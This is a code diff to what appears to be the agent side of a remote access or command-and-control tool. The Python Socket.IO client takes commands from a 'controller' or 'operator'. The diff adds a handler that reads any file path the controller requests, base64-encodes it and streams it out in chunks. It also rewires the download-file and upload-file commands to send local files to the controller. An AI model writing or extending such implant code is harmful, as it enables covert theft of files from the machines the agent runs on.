@@ -3321,8 +3321,10 @@ def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
     chunk_size = 512 * 1024  # 512KB
     filename = os.path.basename(file_path)
     total_size = os.path.getsize(file_path)
+    print(f"Sending file {file_path} ({total_size} bytes) to controller in chunks...")
     with open(file_path, 'rb') as f:
         offset = 0
+        chunk_count = 0
         while True:
             chunk = f.read(chunk_size)
             if not chunk:
@@ -3337,13 +3339,16 @@ def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
                 'destination_path': destination_path or file_path
             })
             offset += len(chunk)
+            chunk_count += 1
+            print(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
     # Notify upload complete
     sio.emit('upload_file_end', {
         'agent_id': agent_id,
         'filename': filename,
         'destination_path': destination_path or file_path
     })
-    return f"File {file_path} sent to controller in chunks"
+    print(f"File upload complete notification sent for {filename}")
+    return f"File {file_path} sent to controller in {chunk_count} chunks"
 
 def handle_file_upload(command_parts):
     """Handle file upload from controller (deprecated, now uses chunked)."""
@@ -3358,6 +3363,7 @@ def handle_file_download(command_parts, agent_id):
 @sio.on('file_chunk_from_operator')
 def on_file_chunk_from_operator(data):
     """Receive a file chunk from the operator and write to disk."""
+    print(f"Received file chunk: {data.get('filename', 'unknown')} at offset {data.get('offset', 0)}")
     filename = data.get('filename')
     chunk_b64 = data.get('data') or data.get('chunk')
     offset = data.get('offset', 0)
@@ -3379,6 +3385,7 @@ def on_file_chunk_from_operator(data):
     buffers[destination_path]['chunks'].append((offset, chunk))
     # Check if file is complete
     received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
+    print(f"File {filename}: received {received_size}/{total_size} bytes")
     if total_size and received_size >= total_size:
         # Sort by offset and write to disk
         buffers[destination_path]['chunks'].sort()
@@ -3394,6 +3401,46 @@ def on_file_upload_complete_from_operator(data):
     filename = data.get('filename')
     destination_path = data.get('destination_path') or filename
     print(f"Upload of {filename} to {destination_path} complete.")
+
+@sio.on('request_file_chunk_from_agent')
+def on_request_file_chunk_from_agent(data):
+    """Handle file download request from controller - send file in chunks."""
+    print(f"File download request received: {data}")
+    filename = data.get('filename')
+    if not filename:
+        print("Invalid file request - no filename provided")
+        return
+    
+    file_path = filename
+    if not os.path.exists(file_path):
+        print(f"File not found: {file_path}")
+        return
+    
+    try:
+        chunk_size = 512 * 1024  # 512KB
+        total_size = os.path.getsize(file_path)
+        print(f"Sending file {file_path} ({total_size} bytes) in chunks...")
+        with open(file_path, 'rb') as f:
+            offset = 0
+            chunk_count = 0
+            while True:
+                chunk = f.read(chunk_size)
+                if not chunk:
+                    break
+                chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
+                sio.emit('file_chunk_from_agent', {
+                    'agent_id': get_or_create_agent_id(),
+                    'filename': filename,
+                    'chunk': chunk_b64,
+                    'offset': offset,
+                    'total_size': total_size
+                })
+                offset += len(chunk)
+                chunk_count += 1
+                print(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
+        print(f"File {file_path} sent to controller in {chunk_count} chunks")
+    except Exception as e:
+        print(f"Error sending file {file_path}: {e}")
 
 def handle_voice_playback(command_parts):
     """Handle voice playback from controller."""
@@ -6186,9 +6233,25 @@ def on_command(data):
     if command in internal_commands:
         output = internal_commands[command]()
     elif command.startswith("upload-file:"):
-        output = handle_file_upload(command.split(":", 2))
+        # New chunked file upload
+        parts = command.split(":", 2)
+        if len(parts) >= 3:
+            file_path = parts[1]
+            destination_path = parts[2] if len(parts) > 2 else None
+            output = send_file_chunked_to_controller(file_path, agent_id, destination_path)
+        else:
+            output = "Invalid upload command format. Use: upload-file:source_path:destination_path"
     elif command.startswith("download-file:"):
-        output = handle_file_download(command.split(":", 1), agent_id)
+        # New chunked file download - this is handled by Socket.IO events
+        parts = command.split(":", 1)
+        if len(parts) >= 2:
+            file_path = parts[1]
+            if os.path.exists(file_path):
+                output = send_file_chunked_to_controller(file_path, agent_id)
+            else:
+                output = f"File not found: {file_path}"
+        else:
+            output = "Invalid download command format. Use: download-file:file_path"
     elif command.startswith("play-voice:"):
         output = handle_voice_playback(command.split(":", 1))
     elif command != "sleep":
